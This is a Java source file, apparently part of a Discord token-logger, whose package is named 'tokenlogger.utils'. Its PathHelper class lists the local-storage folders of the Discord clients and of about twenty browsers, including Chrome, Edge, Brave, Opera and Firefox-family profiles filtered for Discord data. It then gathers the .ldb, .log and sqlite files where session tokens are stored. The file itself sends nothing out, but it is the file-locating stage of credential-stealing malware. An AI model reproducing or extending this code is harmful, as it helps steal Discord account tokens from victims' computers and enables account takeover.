package tokenlogger.utils;

import java.io.IOException;
import java.nio.file.Files;
import java.util.List;
import java.util.ArrayList;
import java.io.File;
import java.nio.file.Paths;
import java.util.stream.Stream;

public class PathHelper {
    public static final String ROAMING = System.getenv("APPDATA");
    public static final String LOCAL = System.getenv("LOCALAPPDATA");
    private static final Boolean HAS_PROFILES = true;
    private static List<String> clientPaths = new ArrayList<>();
    private static List<String> browserPaths = new ArrayList<>();

    public static List<String> loadClientPaths() {
        addPath(clientPaths, ROAMING, "discord");           // Discord
        addPath(clientPaths, ROAMING, "discordcanary");     // Discord Canary
        addPath(clientPaths, ROAMING, "discordptb");        // Discord PTB

        return clientPaths;
    }

    public static List<String> loadBrowserPaths() {
        addPath(browserPaths, LOCAL, "Chromium", "User Data", "Default", "Local Storage", "leveldb");                               // Ungoogled Chromium
        addPath(browserPaths, LOCAL, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb");                       // Google Chrome
        addPath(browserPaths, LOCAL, "Google", "Chrome Beta", "User Data", "Default", "Local Storage", "leveldb");                  // Google Chrome Beta
        addPath(browserPaths, LOCAL, "Google", "Chrome Dev", "User Data", "Default", "Local Storage", "leveldb");                   // Google Chrome Dev
        addPath(browserPaths, LOCAL, "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb");                   // Google Chrome Canary
        addPath(browserPaths, LOCAL, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb");                      // Microsoft Edge
        addPath(browserPaths, LOCAL, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb");         // Brave
        addPath(browserPaths, LOCAL, "Vivaldi", "User Data", "Default", "Local Storage", "leveldb");                                // Vivaldi
        addPath(browserPaths, ROAMING, "Opera Software", "Opera Stable", "Local Storage", "leveldb");                               // Opera
        addPath(browserPaths, ROAMING, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb");                            // Opera GX
        addPath(browserPaths, ROAMING, "Opera Software", "Opera GX", "Local Storage", "leveldb");                                   // Opera GX Legacy
        addPath(browserPaths, ROAMING, "Opera Software", "Opera Next", "Default", "Local Storage", "leveldb");                      // Opera Beta
        addPath(browserPaths, ROAMING, "Opera Software", "Opera Developer", "Default", "Local Storage", "leveldb");                 // Opera Developer
        addPath(browserPaths, LOCAL, "Iridium", "User Data", "Default", "Local Storage", "leveldb");                                // Iridium
        addPath(browserPaths, LOCAL, "Epic Privacy Browser", "User Data", "Default", "Local Storage", "leveldb");                   // Epic Privacy Browser
        addPath(browserPaths, LOCAL, "falkon", "profiles", "default", "Local Storage", "leveldb");                                  // Falkon
        addPath(browserPaths, LOCAL, "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb");                // Yandex
        addPath(browserPaths, HAS_PROFILES, ROAMING, "Mozilla", "Firefox", "Profiles");                                              // Firefox
        addPath(browserPaths, HAS_PROFILES, ROAMING, "Waterfox", "Profiles");                                                        // Waterfox
        addPath(browserPaths, HAS_PROFILES, ROAMING, "librewolf", "Profiles");                                                       // Librewolf
        addPath(browserPaths, HAS_PROFILES, ROAMING, "Moonchild Productions", "Pale Moon", "Profiles");                              // Pale Moon

        browserPaths.forEach(System.out::println);
        return browserPaths;
    }

    private static void addPath(List<String> list, String... elements) {
        list.add(String.join(File.separator, elements));
    }

    private static void addPath(List<String> list, Boolean hasProfiles, String... elements) {
        if (!hasProfiles) return;
        try {
            Files.list(Paths.get(String.join(File.separator, elements)))
                    .flatMap(subfolder -> {
                        try {
                            return Files.list(Paths.get(subfolder.toFile().getAbsolutePath(), "storage", "default"))
                                    .filter(file -> file.toFile().getName().contains("discord"))
                                    .map(file -> Paths.get(file.toFile().getAbsolutePath(), "ls").toString());
                        } catch (IOException e) {
                            return Stream.empty();
                        }
                    })
                    .forEach(list::add);
        } catch (Exception ignored) {}
    }

    public static List<File> listValidFiles(String path) {
        List<File> validFiles = new ArrayList<>();

        File directory = new File(path);
        if (!directory.exists()) return validFiles;

        for (File file : directory.listFiles()) {
            String fileName = file.getName();
            if (fileName.endsWith(".ldb") || fileName.endsWith(".log") || fileName.endsWith("sqlite")) validFiles.add(file);
        }

        return validFiles;
    }

    public static String getJavaPath() {
        return System.getProperty("sun.boot.library.path") + "\\javaw.exe";
    }
}
